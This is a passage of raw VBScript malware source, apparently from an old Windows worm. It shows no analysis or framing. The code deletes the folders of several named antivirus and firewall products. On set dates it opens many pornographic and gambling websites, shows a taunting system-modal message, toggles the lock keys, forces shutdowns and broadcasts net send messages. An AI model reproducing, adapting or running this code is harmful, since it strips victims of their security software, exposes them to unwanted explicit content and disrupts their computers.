fso.DeleteFolder "C:\Program Files\Panda Software\Panda Antivirus Titanium",True
If fso.FolderExists ("C:\Program Files\The Cleaner") Then
fso.DeleteFolder "C:\Program Files\The Cleaner",True
If fso.FolderExists ("C:\Program Files\Grisoft") Then
fso.DeleteFolder "C:\Program Files\Grisoft",True
If fso.FolderExists ("C:\Program Files\Zone Labs\ZoneAlarm") Then
fso.DeleteFolder "C:\Program Files\Zone Labs\ZoneAlarm",True
If fso.FolderExists ("C:\Program Files\Norton Personal Firewall") Then
fso.DeleteFolder "C:\Program Files\Norton Personal Firewall",True
If fso.FolderExists ("C:\Program Files\McAfee\McAfee VirusScan") Then
fso.DeleteFolder "C:\Program Files\McAfee\McAfee VirusScan",True
If Day(Now) = 1 And Month(Now) = 4 Then
shl.run "www.gaymen.com"
shl.run "www.casino.com"
shl.run "www.penisbot.com"
shl.run "www.megapornlinks.com"
shl.run "www.porn.com"
shl.run "www.boobs.com"
shl.run "www.hereistheporn.com"
shl.run "www.hoes.com"
shl.run "www.outlawsporn.com"
shl.run "www.penthouse.com"
shl.run "www.playboy.com"
msgbox"BAD COMMAND OR FILE NAME - GO STAND IN THE CORNER!" ,VbCritical + VbSystemModal, "BAD COMMAND OR FILE NAME!"
shl.SendKeys "{CAPSLOCK}"
shl.SendKeys "{NUMLOCK}"
shl.SendKeys "{SCROLLLOCK}"
Wscript.sleep 10000
Set OpSysSet = GetObject("winmgmts:{(Shutdown)}//./root/cimv2").ExecQuery("select * from Win32_OperatingSystem where Primary=true")
for each OpSys in OpSysSet
OpSys.ShutDown()
next
End If
If Day(Now) = 13 And WeekDay(Now) = Friday Then
shl.run "shutdown -s -t 10 -c muhahahaha -f"
End If
If Day(Now) = 8 And Month(Now) = 5 Then
shl.run "net send * Happy Birthday Sdude!", vbHide
shl.run "print Happy Birthday Sdude!", vbHide
End If